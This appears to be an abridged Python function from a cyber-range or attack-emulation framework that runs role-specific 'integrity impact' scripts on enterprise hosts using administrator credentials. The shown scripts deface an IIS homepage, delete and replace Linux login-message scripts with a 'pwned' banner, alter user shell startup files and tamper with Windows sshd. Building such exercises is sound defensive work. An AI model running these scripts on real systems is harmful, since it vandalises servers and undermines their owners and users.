...
def impact_integrity(node: dict, enterprise: dict) -> dict:
    ...
    user = 'ubuntu' if 'linux' in node_desc['roles'] else f'administrator@{domain}.{enterprise_url}'
    password = None if 'linux' in node_desc['roles'] else domain_details['admin_pass']
    print(f"Attempting to impact {node['name']} with user={user}, password={password}")
    ...
    try:
        ...
        script_content = None
        filename_base = None
        is_windows = 'windows' in node_desc['roles'] or 'iis' in node_desc['roles']

        if 'fileserver' in node_desc['roles']:
            filename_base = "impact_fs_integrity"
            script_content = """
#!/bin/bash

# Modify user home directories and new-user default home dirs
for bashrc_file in /srv/homedirs/*/.bashrc /etc/skel/.bashrc; do
...
"""
            ...
            filename_base = "impact_sp_integrity"
            script_content = """
#!/bin/bash
...
"""
            ...
            filename_base = "impact_idp_integrity"
            script_content = """
#!/bin/bash

# Modify Shibboleth IDP message properties
...
"""
            ...
            filename_base = "impact_linux_integrity"
            script_content = """
#!/bin/bash

# Inject pwned prompt via update-motd
rm -f /etc/update-motd.d/*
cat << 'EOF' > /etc/update-motd.d/99-pwned
#!/bin/bash
...
EOF
chmod +x /etc/update-motd.d/99-pwned
ln -sf /run/motd.dynamic /etc/motd
run-parts /etc/update-motd.d > /run/motd.dynamic
"""
            verify_tag = "you've been pwnd"

        elif 'iis' in node_desc['roles']:
            filename_base = "impact_iis_integrity"
            script_content = """
# impact_iis_integrity.ps1

$htmlPath = "C:\\inetpub\\wwwroot\\index.html"

if (Test-Path $htmlPath) {
    $content = Get-Content $htmlPath
    $newContent = $content -replace "<h1>.*?</h1>", "<h1>This site has been pwnd.</h1>"
    $newContent | Set-Content $htmlPath -Force
    Write-Output "[impact_integrity] defacement complete"
} else {
    Write-Output "[impact_integrity] no index.html found"
}
"""
            verify_tag = "[impact_integrity] defacement complete"

        elif 'windows' in node_desc['roles']:
            filename_base = "impact_windows_integrity"
            script_content = """
# impact_windows_integrity.ps1
...
Write-Output "finished pwning sshd"
"""
        ...
        if is_windows:
            stdout, stderr, exit_status = shell.execute_powershell_multiline(
                script_content, filename=filename_base, verbose=verbose
            )
        else:
            stdout, stderr, exit_status = shell.execute_bash_multiline(
                script_content, filename=filename_base, verbose=verbose
            )

        result["cmd"] = script_content
        result["stdout"] = stdout
        result["stderr"] = stderr
        result["exit_status"] = exit_status
